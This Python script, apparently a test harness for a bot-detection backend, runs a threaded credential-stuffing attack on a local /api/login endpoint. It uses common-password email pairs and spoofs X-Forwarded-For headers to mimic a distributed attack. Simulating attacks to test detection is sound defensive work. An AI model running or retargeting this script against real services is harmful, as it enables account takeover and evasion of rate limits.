"""
bot_attack.py  —  Credential Stuffing Simulator
================================================
Hammers the /api/login endpoint to simulate a real bot attack.
Run AFTER starting the backend: python bot_attack.py
"""

import requests
import random
import time
import threading

TARGET_URL = "http://localhost:5000/api/login"

# ── Fake credential combos a real attacker might use ──────────────────────────
CREDENTIALS = [
    ("alice@gmail.com",    "password123"),
    ("bob@yahoo.com",      "123456"),
    ("charlie@hotmail.com","qwerty"),
    ("diana@gmail.com",    "letmein"),
    ("eve@outlook.com",    "monkey"),
    ("frank@gmail.com",    "dragon"),
    ("grace@icloud.com",   "master"),
    ("henry@gmail.com",    "login"),
    ("irene@yahoo.com",    "hello"),
    ("jack@gmail.com",     "abc123"),
    ("karen@gmail.com",    "password1"),
    ("leo@hotmail.com",    "sunshine"),
    ("mia@gmail.com",      "shadow"),
    ("noah@gmail.com",     "princess"),
    ("olivia@yahoo.com",   "superman"),
]

# ── Fake IPs to simulate distributed attack ───────────────────────────────────
FAKE_IPS = [
    "45.33.32.156", "103.21.244.0", "198.41.128.0",
    "185.220.101.5", "91.108.4.0", "89.248.167.131",
    "193.142.146.35", "77.247.181.162", "171.25.193.20",
    "176.10.104.240"
]

SUCCESS = 0
FAILED  = 0
TOTAL   = 0
LOCK    = threading.Lock()

def attack_once():
    global SUCCESS, FAILED, TOTAL

    email, pwd = random.choice(CREDENTIALS)
    fake_ip    = random.choice(FAKE_IPS)

    headers = {
        "X-Forwarded-For": fake_ip,
        "User-Agent": "python-bot/1.0"
    }

    try:
        r = requests.post(TARGET_URL, json={"email": email, "password": pwd},
                          headers=headers, timeout=3)
        with LOCK:
            TOTAL += 1
            if r.status_code == 200:
                SUCCESS += 1
                print(f"[HIT]  {fake_ip} → {email} ✓")
            else:
                FAILED += 1
                print(f"[MISS] {fake_ip} → {email} ✗")
    except Exception as e:
        print(f"[ERR] {e}")

def run_attack(total_requests=200, threads=10, delay=0.05):
    print("=" * 55)
    print("  STRIX AI — BOT ATTACK SIMULATOR")
    print(f"  Sending {total_requests} requests | {threads} threads")
    print("=" * 55)

    batch = []
    for _ in range(total_requests):
        t = threading.Thread(target=attack_once)
        batch.append(t)
        t.start()
        time.sleep(delay)          # slight delay between spawns

    for t in batch:
        t.join()

    print("\n" + "=" * 55)
    print(f"  DONE  |  Total: {TOTAL}  Hit: {SUCCESS}  Miss: {FAILED}")
    print("=" * 55)

if __name__ == "__main__":
    run_attack(total_requests=200, threads=10, delay=0.05)